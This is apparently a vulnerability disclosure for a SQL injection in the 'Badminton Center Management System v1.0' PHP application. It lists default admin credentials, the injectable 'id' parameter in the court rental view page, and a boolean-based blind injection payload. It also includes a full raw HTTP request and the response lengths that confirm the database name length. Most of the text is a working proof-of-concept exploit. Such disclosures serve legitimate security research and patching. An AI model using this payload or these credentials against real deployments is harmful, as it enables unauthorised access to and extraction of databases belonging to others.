# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: /bcms/admin/?page=court_rentals/view_court_rental&id=

Vulnerability location: /bcms/admin/?page=court_rentals/view_court_rental&id=, id

[+] Payload: /bcms/admin/?page=court_rentals/view_court_rental&id=2%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /bcms/admin/?page=court_rentals/view_court_rental&id=2%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 31307
![image](https://user-images.githubusercontent.com/54017627/170617118-c7c6153e-6fd2-44b4-a749-d42a84fdee60.png)

![image](https://user-images.githubusercontent.com/54017627/170616986-feb90eea-e841-4a2d-ae8d-0c845fafde71.png)

When length (database ()) = 7, Content-Length: 32562
![image](https://user-images.githubusercontent.com/54017627/170617065-98c515db-86e0-45a8-b9c5-817b5e27090f.png)

![image](https://user-images.githubusercontent.com/54017627/170616845-803b358a-0dbb-43ac-be4c-7166a88e030c.png)
